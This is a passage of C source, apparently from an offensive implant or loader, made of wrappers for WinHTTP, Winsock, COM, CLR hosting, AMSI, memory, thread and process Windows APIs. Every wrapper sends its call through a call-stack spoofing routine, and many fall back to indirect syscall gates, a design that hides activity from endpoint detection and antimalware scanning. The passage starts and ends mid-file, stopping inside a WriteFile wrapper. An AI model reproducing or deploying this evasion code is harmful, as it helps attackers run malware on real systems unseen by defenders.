    call.ptr    = (PVOID)(WINHTTP$WinHttpOpen);
    call.gadget = WINHTTP_GADGET;
    call.argc = 5;
    call.args[0] = spoof_arg(pszAgentW);
    call.args[1] = spoof_arg(dwAccessType);
    call.args[2] = spoof_arg(pszProxyW);
    call.args[3] = spoof_arg(pszProxyBypassW);
    call.args[4] = spoof_arg(dwFlags);
    return (HINTERNET)spoof_call(&call);
}

HINTERNET WINAPI _WinHttpConnect( HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpConnect);
    call.gadget = WINHTTP_GADGET;
    call.argc = 4;
    call.args[0] = spoof_arg(hSession);
    call.args[1] = spoof_arg(pswzServerName);
    call.args[2] = spoof_arg(nServerPort);
    call.args[3] = spoof_arg(dwReserved);
    return (HINTERNET)spoof_call(&call);
}

HINTERNET WINAPI _WinHttpOpenRequest( HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpOpenRequest);
    call.gadget = WINHTTP_GADGET;
    call.argc = 7;
    call.args[0] = spoof_arg(hConnect);
    call.args[1] = spoof_arg(pwszVerb);
    call.args[2] = spoof_arg(pwszObjectName);
    call.args[3] = spoof_arg(pwszVersion);
    call.args[4] = spoof_arg(pwszReferrer);
    call.args[5] = spoof_arg(ppwszAcceptTypes);
    call.args[6] = spoof_arg(dwFlags);
    return (HINTERNET)spoof_call(&call);
}

BOOL WINAPI _WinHttpSetOption( HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpSetOption);
    call.gadget = WINHTTP_GADGET;
    call.argc = 4;
    call.args[0] = spoof_arg(hInternet);
    call.args[1] = spoof_arg(dwOption);
    call.args[2] = spoof_arg(lpBuffer);
    call.args[3] = spoof_arg(dwBufferLength);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpAddRequestHeaders( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpAddRequestHeaders);
    call.gadget = WINHTTP_GADGET;
    call.argc = 4;
    call.args[0] = spoof_arg(hRequest);
    call.args[1] = spoof_arg(lpszHeaders);
    call.args[2] = spoof_arg(dwHeadersLength);
    call.args[3] = spoof_arg(dwModifiers);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpSendRequest( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpSendRequest);
    call.gadget = WINHTTP_GADGET;
    call.argc = 7;
    call.args[0] = spoof_arg(hRequest);
    call.args[1] = spoof_arg(lpszHeaders);
    call.args[2] = spoof_arg(dwHeadersLength);
    call.args[3] = spoof_arg(lpOptional);
    call.args[4] = spoof_arg(dwOptionalLength);
    call.args[5] = spoof_arg(dwTotalLength);
    call.args[6] = spoof_arg(dwContext);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpReceiveResponse( HINTERNET hRequest, LPVOID lpReserved )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpReceiveResponse);
    call.gadget = WINHTTP_GADGET;
    call.argc = 2;
    call.args[0] = spoof_arg(hRequest);
    call.args[1] = spoof_arg(lpReserved);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpReadData( HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpReadData);
    call.gadget = WINHTTP_GADGET;
    call.argc = 4;
    call.args[0] = spoof_arg(hRequest);
    call.args[1] = spoof_arg(lpBuffer);
    call.args[2] = spoof_arg(dwNumberOfBytesToRead);
    call.args[3] = spoof_arg(lpdwNumberOfBytesRead);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpQueryHeaders( HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpQueryHeaders);
    call.gadget = WINHTTP_GADGET;
    call.argc = 6;
    call.args[0] = spoof_arg(hRequest);
    call.args[1] = spoof_arg(dwInfoLevel);
    call.args[2] = spoof_arg(pwszName);
    call.args[3] = spoof_arg(lpBuffer);
    call.args[4] = spoof_arg(lpdwBufferLength);
    call.args[5] = spoof_arg(lpdwIndex);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WinHttpCloseHandle( HINTERNET hInternet )
{
    FUNCTION_CALL call = { 0 };
    call.ptr    = (PVOID)(WINHTTP$WinHttpCloseHandle);
    call.gadget = WINHTTP_GADGET;
    call.argc = 1;
    call.args[0] = spoof_arg(hInternet);
    return (BOOL)spoof_call(&call);
}

/* ======================================================================== */
/* WS2_32                                                                    */
/* ======================================================================== */

DECLSPEC_IMPORT int    WSAAPI WS2_32$WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData );
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$WSASocketA( int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags );
DECLSPEC_IMPORT int    WSAAPI WS2_32$WSACleanup( void );
DECLSPEC_IMPORT int    WSAAPI WS2_32$connect( SOCKET s, const struct sockaddr *name, int namelen );
DECLSPEC_IMPORT int    WSAAPI WS2_32$send( SOCKET s, const char *buf, int len, int flags );
DECLSPEC_IMPORT int    WSAAPI WS2_32$recv( SOCKET s, char *buf, int len, int flags );
DECLSPEC_IMPORT int    WSAAPI WS2_32$closesocket( SOCKET s );
DECLSPEC_IMPORT int    WSAAPI WS2_32$getaddrinfo( PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult );

int WSAAPI _WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$WSAStartup);
    call.argc = 2;
    call.args[0] = spoof_arg(wVersionRequired);
    call.args[1] = spoof_arg(lpWSAData);
    return (int)spoof_call(&call);
}

SOCKET WSAAPI _WSASocketA( int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$WSASocketA);
    call.argc = 6;
    call.args[0] = spoof_arg(af);
    call.args[1] = spoof_arg(type);
    call.args[2] = spoof_arg(protocol);
    call.args[3] = spoof_arg(lpProtocolInfo);
    call.args[4] = spoof_arg(g);
    call.args[5] = spoof_arg(dwFlags);
    return (SOCKET)spoof_call(&call);
}

int WSAAPI _WSACleanup( void )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$WSACleanup);
    call.argc = 0;
    return (int)spoof_call(&call);
}

int WSAAPI _connect( SOCKET s, const struct sockaddr *name, int namelen )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$connect);
    call.argc = 3;
    call.args[0] = spoof_arg(s);
    call.args[1] = spoof_arg(name);
    call.args[2] = spoof_arg(namelen);
    return (int)spoof_call(&call);
}

int WSAAPI _send( SOCKET s, const char *buf, int len, int flags )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$send);
    call.argc = 4;
    call.args[0] = spoof_arg(s);
    call.args[1] = spoof_arg(buf);
    call.args[2] = spoof_arg(len);
    call.args[3] = spoof_arg(flags);
    return (int)spoof_call(&call);
}

int WSAAPI _recv( SOCKET s, char *buf, int len, int flags )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$recv);
    call.argc = 4;
    call.args[0] = spoof_arg(s);
    call.args[1] = spoof_arg(buf);
    call.args[2] = spoof_arg(len);
    call.args[3] = spoof_arg(flags);
    return (int)spoof_call(&call);
}

int WSAAPI _closesocket( SOCKET s )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$closesocket);
    call.argc = 1;
    call.args[0] = spoof_arg(s);
    return (int)spoof_call(&call);
}

int WSAAPI _getaddrinfo( PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(WS2_32$getaddrinfo);
    call.argc = 4;
    call.args[0] = spoof_arg(pNodeName);
    call.args[1] = spoof_arg(pServiceName);
    call.args[2] = spoof_arg(pHints);
    call.args[3] = spoof_arg(ppResult);
    return (int)spoof_call(&call);
}

/* ======================================================================== */
/* OLE32                                                                     */
/* ======================================================================== */

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv );

HRESULT WINAPI _CoCreateInstance( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLE32$CoCreateInstance);
    call.argc = 5;
    call.args[0] = spoof_arg(rclsid);
    call.args[1] = spoof_arg(pUnkOuter);
    call.args[2] = spoof_arg(dwClsContext);
    call.args[3] = spoof_arg(riid);
    call.args[4] = spoof_arg(ppv);
    return (HRESULT)spoof_call(&call);
}

/* ======================================================================== */
/* OLEAUT32                                                                  */
/* ======================================================================== */

DECLSPEC_IMPORT SAFEARRAY * WINAPI OLEAUT32$SafeArrayCreate( VARTYPE vt, UINT cDims, SAFEARRAYBOUND *rgsabound );
DECLSPEC_IMPORT SAFEARRAY * WINAPI OLEAUT32$SafeArrayCreateVector( VARTYPE vt, LONG lLbound, ULONG cElements );
DECLSPEC_IMPORT HRESULT     WINAPI OLEAUT32$SafeArrayPutElement( SAFEARRAY *psa, LONG *rgIndices, void *pv );
DECLSPEC_IMPORT HRESULT     WINAPI OLEAUT32$SafeArrayDestroy( SAFEARRAY *psa );
DECLSPEC_IMPORT BSTR        WINAPI OLEAUT32$SysAllocString( const OLECHAR *psz );

SAFEARRAY * WINAPI _SafeArrayCreate( VARTYPE vt, UINT cDims, SAFEARRAYBOUND *rgsabound )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLEAUT32$SafeArrayCreate);
    call.argc = 3;
    call.args[0] = spoof_arg(vt);
    call.args[1] = spoof_arg(cDims);
    call.args[2] = spoof_arg(rgsabound);
    return (SAFEARRAY *)spoof_call(&call);
}

SAFEARRAY * WINAPI _SafeArrayCreateVector( VARTYPE vt, LONG lLbound, ULONG cElements )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLEAUT32$SafeArrayCreateVector);
    call.argc = 3;
    call.args[0] = spoof_arg(vt);
    call.args[1] = spoof_arg(lLbound);
    call.args[2] = spoof_arg(cElements);
    return (SAFEARRAY *)spoof_call(&call);
}

HRESULT WINAPI _SafeArrayPutElement( SAFEARRAY *psa, LONG *rgIndices, void *pv )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLEAUT32$SafeArrayPutElement);
    call.argc = 3;
    call.args[0] = spoof_arg(psa);
    call.args[1] = spoof_arg(rgIndices);
    call.args[2] = spoof_arg(pv);
    return (HRESULT)spoof_call(&call);
}

HRESULT WINAPI _SafeArrayDestroy( SAFEARRAY *psa )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLEAUT32$SafeArrayDestroy);
    call.argc = 1;
    call.args[0] = spoof_arg(psa);
    return (HRESULT)spoof_call(&call);
}

BSTR WINAPI _SysAllocString( const OLECHAR *psz )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(OLEAUT32$SysAllocString);
    call.argc = 1;
    call.args[0] = spoof_arg(psz);
    return (BSTR)spoof_call(&call);
}

/* ======================================================================== */
/* MSCOREE                                                                   */
/* ======================================================================== */

DECLSPEC_IMPORT HRESULT WINAPI MSCOREE$CLRCreateInstance( REFCLSID clsid, REFIID riid, LPVOID *ppInterface );

HRESULT WINAPI _CLRCreateInstance( REFCLSID clsid, REFIID riid, LPVOID *ppInterface )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(MSCOREE$CLRCreateInstance);
    call.argc = 3;
    call.args[0] = spoof_arg(clsid);
    call.args[1] = spoof_arg(riid);
    call.args[2] = spoof_arg(ppInterface);
    return (HRESULT)spoof_call(&call);
}

/* ======================================================================== */
/* AMSI                                                                      */
/* ======================================================================== */

DECLSPEC_IMPORT HRESULT WINAPI AMSI$AmsiScanBuffer( HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result );

HRESULT WINAPI _AmsiScanBuffer( HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(AMSI$AmsiScanBuffer);
    call.argc = 6;
    call.args[0] = spoof_arg(amsiContext);
    call.args[1] = spoof_arg(buffer);
    call.args[2] = spoof_arg(length);
    call.args[3] = spoof_arg(contentName);
    call.args[4] = spoof_arg(amsiSession);
    call.args[5] = spoof_arg(result);
    return (HRESULT)spoof_call(&call);
}

/* ======================================================================== */
/* KERNEL32 — Memory (additional)                                            */
/* ======================================================================== */

DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtectEx   ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQuery       ( LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile      ( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$UnmapViewOfFile    ( LPCVOID lpBaseAddress );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA ( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName );

BOOL WINAPI _VirtualProtectEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtProtectVirtualMemory.jmpAddr ) {
        PVOID  base = lpAddress;
        SIZE_T size = dwSize;
        GATE_CALL( call, g_gates.NtProtectVirtualMemory );
        call.argc    = 5;
        call.args[0] = spoof_arg( hProcess );
        call.args[1] = spoof_arg( &base );
        call.args[2] = spoof_arg( &size );
        call.args[3] = spoof_arg( (ULONG)flNewProtect );
        call.args[4] = spoof_arg( lpflOldProtect );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualProtectEx);
    call.argc    = 5;
    call.args[0] = spoof_arg( hProcess );
    call.args[1] = spoof_arg( lpAddress );
    call.args[2] = spoof_arg( dwSize );
    call.args[3] = spoof_arg( flNewProtect );
    call.args[4] = spoof_arg( lpflOldProtect );
    return (BOOL)spoof_call( &call );
}

SIZE_T WINAPI _VirtualQuery( LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtQueryVirtualMemory.jmpAddr ) {
        SIZE_T returned = 0;
        GATE_CALL( call, g_gates.NtQueryVirtualMemory );
        call.argc    = 6;
        call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[1] = spoof_arg( lpAddress );
        call.args[2] = spoof_arg( 0ULL );  /* MemoryBasicInformation */
        call.args[3] = spoof_arg( lpBuffer );
        call.args[4] = spoof_arg( dwLength );
        call.args[5] = spoof_arg( &returned );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? returned : 0;
    }
    call.ptr     = (PVOID)(KERNEL32$VirtualQuery);
    call.argc    = 3;
    call.args[0] = spoof_arg( lpAddress );
    call.args[1] = spoof_arg( lpBuffer );
    call.args[2] = spoof_arg( dwLength );
    return (SIZE_T)spoof_call( &call );
}

LPVOID WINAPI _MapViewOfFile( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtMapViewOfSection.jmpAddr ) {
        /* Convert FILE_MAP_* flags to PAGE_* protection */
        ULONG prot = (dwDesiredAccess & 0x02) ? 0x04 :   /* WRITE  → PAGE_READWRITE  */
                     (dwDesiredAccess & 0x01) ? 0x08 :   /* COPY   → PAGE_WRITECOPY  */
                                               0x02;     /* else   → PAGE_READONLY   */
        if ( dwDesiredAccess & 0x20 ) prot *= 0x10;      /* EXECUTE multiplies by 0x10 */
        PVOID          base   = NULL;
        SIZE_T         vsize  = dwNumberOfBytesToMap;
        LARGE_INTEGER  offset = { 0 };
        offset.LowPart  = dwFileOffsetLow;
        offset.HighPart = (LONG)dwFileOffsetHigh;
        GATE_CALL( call, g_gates.NtMapViewOfSection );
        call.argc     = 10;
        call.args[0]  = spoof_arg( hFileMappingObject );
        call.args[1]  = spoof_arg( (HANDLE)(LONG_PTR)-1 );  /* current process */
        call.args[2]  = spoof_arg( &base );
        call.args[3]  = spoof_arg( 0ULL );                  /* ZeroBits */
        call.args[4]  = spoof_arg( 0ULL );                  /* CommitSize */
        call.args[5]  = spoof_arg( &offset );
        call.args[6]  = spoof_arg( &vsize );
        call.args[7]  = spoof_arg( (ULONG)2 );              /* ViewUnmap */
        call.args[8]  = spoof_arg( 0ULL );                  /* AllocationType */
        call.args[9]  = spoof_arg( prot );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? base : NULL;
    }
    call.ptr  = (PVOID)(KERNEL32$MapViewOfFile);
    call.argc = 5;
    call.args[0] = spoof_arg( hFileMappingObject );
    call.args[1] = spoof_arg( dwDesiredAccess );
    call.args[2] = spoof_arg( dwFileOffsetHigh );
    call.args[3] = spoof_arg( dwFileOffsetLow );
    call.args[4] = spoof_arg( dwNumberOfBytesToMap );
    return (LPVOID)spoof_call( &call );
}

BOOL WINAPI _UnmapViewOfFile( LPCVOID lpBaseAddress )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtUnmapViewOfSection.jmpAddr ) {
        GATE_CALL( call, g_gates.NtUnmapViewOfSection );
        call.argc    = 2;
        call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
        call.args[1] = spoof_arg( lpBaseAddress );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$UnmapViewOfFile);
    call.argc    = 1;
    call.args[0] = spoof_arg( lpBaseAddress );
    return (BOOL)spoof_call( &call );
}

HANDLE WINAPI _CreateFileMappingA( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName )
{
    FUNCTION_CALL call = { 0 };
    /* Named sections need a Unicode OBJECT_ATTRIBUTES — fall back to Win32 */
    if ( g_gates.NtCreateSection.jmpAddr && lpName == NULL ) {
        HANDLE         hSection = NULL;
        ULONG          prot     = flProtect & 0xFF;         /* PAGE_* bits */
        ULONG          attrs    = flProtect & ~0xFF;        /* SEC_* bits  */
        if ( !attrs ) attrs     = 0x8000000;                /* SEC_COMMIT  */
        HANDLE         fh       = ( hFile == INVALID_HANDLE_VALUE ) ? NULL : hFile;
        LARGE_INTEGER  maxSize  = { 0 };
        maxSize.LowPart         = dwMaximumSizeLow;
        maxSize.HighPart        = (LONG)dwMaximumSizeHigh;
        LARGE_INTEGER *pMaxSize = ( dwMaximumSizeHigh || dwMaximumSizeLow ) ? &maxSize : NULL;
        GATE_CALL( call, g_gates.NtCreateSection );
        call.argc    = 7;
        call.args[0] = spoof_arg( &hSection );
        call.args[1] = spoof_arg( (ULONG)0xF001F );        /* SECTION_ALL_ACCESS */
        call.args[2] = spoof_arg( 0ULL );                  /* ObjectAttributes = NULL */
        call.args[3] = spoof_arg( pMaxSize );
        call.args[4] = spoof_arg( prot );
        call.args[5] = spoof_arg( attrs );
        call.args[6] = spoof_arg( fh );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? hSection : NULL;
    }
    call.ptr  = (PVOID)(KERNEL32$CreateFileMappingA);
    call.argc = 6;
    call.args[0] = spoof_arg( hFile );
    call.args[1] = spoof_arg( lpFileMappingAttributes );
    call.args[2] = spoof_arg( flProtect );
    call.args[3] = spoof_arg( dwMaximumSizeHigh );
    call.args[4] = spoof_arg( dwMaximumSizeLow );
    call.args[5] = spoof_arg( lpName );
    return (HANDLE)spoof_call( &call );
}

/* ======================================================================== */
/* KERNEL32 — Thread (additional)                                            */
/* ======================================================================== */

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenThread      ( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetThreadContext( HANDLE hThread, const CONTEXT *lpContext );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetThreadContext( HANDLE hThread, LPCONTEXT lpContext );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DuplicateHandle ( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions );

HANDLE WINAPI _OpenThread( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtOpenThread.jmpAddr ) {
        HANDLE            hThread = NULL;
        CK_OBJECT_ATTRIBUTES oa   = { sizeof(oa), NULL, NULL, bInheritHandle ? OBJ_INHERIT : 0, NULL, NULL };
        CK_CLIENT_ID      ci      = { NULL, ULongToHandle(dwThreadId) };
        GATE_CALL( call, g_gates.NtOpenThread );
        call.argc    = 4;
        call.args[0] = spoof_arg( &hThread );
        call.args[1] = spoof_arg( dwDesiredAccess );
        call.args[2] = spoof_arg( &oa );
        call.args[3] = spoof_arg( &ci );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? hThread : NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$OpenThread);
    call.argc    = 3;
    call.args[0] = spoof_arg( dwDesiredAccess );
    call.args[1] = spoof_arg( bInheritHandle );
    call.args[2] = spoof_arg( dwThreadId );
    return (HANDLE)spoof_call( &call );
}

BOOL WINAPI _SetThreadContext( HANDLE hThread, const CONTEXT *lpContext )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtSetContextThread.jmpAddr ) {
        GATE_CALL( call, g_gates.NtSetContextThread );
        call.argc    = 2;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( lpContext );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$SetThreadContext);
    call.argc    = 2;
    call.args[0] = spoof_arg( hThread );
    call.args[1] = spoof_arg( lpContext );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _GetThreadContext( HANDLE hThread, LPCONTEXT lpContext )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtGetContextThread.jmpAddr ) {
        GATE_CALL( call, g_gates.NtGetContextThread );
        call.argc    = 2;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( lpContext );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$GetThreadContext);
    call.argc    = 2;
    call.args[0] = spoof_arg( hThread );
    call.args[1] = spoof_arg( lpContext );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _DuplicateHandle( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtDuplicateObject.jmpAddr ) {
        GATE_CALL( call, g_gates.NtDuplicateObject );
        call.argc    = 7;
        call.args[0] = spoof_arg( hSourceProcessHandle );
        call.args[1] = spoof_arg( hSourceHandle );
        call.args[2] = spoof_arg( hTargetProcessHandle );
        call.args[3] = spoof_arg( lpTargetHandle );
        call.args[4] = spoof_arg( dwDesiredAccess );
        call.args[5] = spoof_arg( bInheritHandle ? OBJ_INHERIT : 0UL );
        call.args[6] = spoof_arg( (ULONG)dwOptions );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$DuplicateHandle);
    call.argc    = 7;
    call.args[0] = spoof_arg( hSourceProcessHandle );
    call.args[1] = spoof_arg( hSourceHandle );
    call.args[2] = spoof_arg( hTargetProcessHandle );
    call.args[3] = spoof_arg( lpTargetHandle );
    call.args[4] = spoof_arg( dwDesiredAccess );
    call.args[5] = spoof_arg( bInheritHandle );
    call.args[6] = spoof_arg( dwOptions );
    return (BOOL)spoof_call( &call );
}

/* ======================================================================== */
/* KERNEL32 — Process (additional)                                           */
/* ======================================================================== */

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessW( LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );

/* 10 args */
BOOL WINAPI _CreateProcessW( LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
{
    FUNCTION_CALL call = { 0 };
    call.ptr   = (PVOID)(KERNEL32$CreateProcessW);
    call.argc  = 10;
    call.args[0] = spoof_arg(lpApplicationName);
    call.args[1] = spoof_arg(lpCommandLine);
    call.args[2] = spoof_arg(lpProcessAttributes);
    call.args[3] = spoof_arg(lpThreadAttributes);
    call.args[4] = spoof_arg(bInheritHandles);
    call.args[5] = spoof_arg(dwCreationFlags);
    call.args[6] = spoof_arg(lpEnvironment);
    call.args[7] = spoof_arg(lpCurrentDirectory);
    call.args[8] = spoof_arg(lpStartupInfo);
    call.args[9] = spoof_arg(lpProcessInformation);
    return (BOOL)spoof_call(&call);
}

/* ======================================================================== */
/* KERNEL32 — Library and File (additional)                                  */
/* ======================================================================== */

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryW    ( LPCWSTR lpLibFileName );
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FreeLibrary     ( HMODULE hLibModule );
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteFile       ( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile        ( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped );
HMODULE WINAPI _LoadLibraryW( LPCWSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$LoadLibraryW);
    call.argc = 1;
    call.args[0] = spoof_arg(lpLibFileName);
    return (HMODULE)spoof_call(&call);
}

BOOL WINAPI _FreeLibrary( HMODULE hLibModule )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$FreeLibrary);
    call.argc = 1;
    call.args[0] = spoof_arg(hLibModule);
    return (BOOL)spoof_call(&call);
}

BOOL WINAPI _WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtWriteFile.jmpAddr ) {
        CK_IO_STATUS_BLOCK iosb = { 0 };
        GATE_CALL( call, g_gates.NtWriteFile );
        call.argc    = 9;
        call.args[0] = spoof_arg( hFile );
        call.args[1] = spoof_arg( 0ULL );               // Event
